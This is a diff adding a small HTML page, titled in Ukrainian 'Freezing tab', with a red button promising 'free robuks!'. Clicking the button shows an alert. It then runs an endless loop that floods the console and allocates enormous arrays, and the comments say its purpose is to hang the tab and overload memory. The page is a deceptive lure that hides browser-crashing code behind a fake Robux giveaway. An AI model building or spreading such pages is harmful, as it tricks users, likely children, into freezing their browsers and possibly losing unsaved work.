@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Зависаюча вкладка</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            margin: 0;
+        }
+        button {
+            padding: 20px 40px;
+            font-size: 18px;
+            background-color: #ff4444;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: #cc0000;
+        }
+    </style>
+</head>
+<body>
+    <button onclick="crashTab()">free robuks!</button>
+
+    <script>
+        function crashTab() {
+            alert("are you sure!");
+            // Безкінечний цикл для зависання
+            while (true) {
+                console.log("sending free robuks" + Math.random()); // Заповнює консоль
+                // Додаємо безкінечне створення об’єктів для перевантаження пам’яті
+                let arr = [];
+                for (let i = 0; i < 1000000; i++) {
+                    arr.push(new Array(1000000).fill(Math.random()));
+                }
+            }
+        }
+    </script>
+</body>
+  </html>
